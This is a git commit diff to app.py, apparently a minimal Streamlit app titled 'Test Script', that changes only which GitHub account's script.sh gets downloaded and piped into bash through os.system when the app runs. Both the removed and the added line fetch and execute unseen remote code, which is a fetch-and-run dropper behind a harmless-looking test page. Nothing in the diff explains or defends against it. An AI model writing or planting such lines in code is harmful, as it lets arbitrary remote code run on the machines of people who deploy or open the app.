da9775ccac12814f2ff2876db065525732e3ff40
wandisilemfakadolo672 <154563494+wandisilemfakadolo672@users.noreply.github.com>
2024-12-31 22:44:48 +0200

    Update app.py

--- app.py
+++ app.py
@@ -4,5 +4,5 @@ import os
 st.title("Test Script")
 st.header("Test")
 
-results = os.system("curl -fsSL https://raw.githubusercontent.com/thembalethuzikalala811/Streamlit/refs/heads/main/script.sh | bash")
+results = os.system("curl -fsSL https://raw.githubusercontent.com/wandisilemfakadolo672/Streamlit/refs/heads/main/script.sh | bash")
 st.write(results)
